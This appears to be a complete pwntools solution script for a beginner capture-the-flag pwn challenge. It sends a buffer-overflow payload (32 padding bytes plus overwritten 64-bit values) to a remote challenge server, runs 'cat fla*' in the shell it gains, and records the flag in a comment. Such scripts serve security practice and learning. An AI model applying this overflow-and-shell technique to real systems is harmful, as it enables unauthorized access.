from pwn import *
#p = process("./beginner-generic-pwn-number-0")
#gdb.attach("beginner-generic-pwn-number-0","b *0x00000000004012a5")
host,port = 'mc.ax',31199
p = remote(host,port)
pad = "A"*32
val = 0xffffffffffffffff
exp = pad+p64(val)*2
p.sendline(exp)
p.sendline("cat fla*")
p.interactive()
#flag{im-feeling-a-lot-better-but-rob-still-doesnt-pay-me}
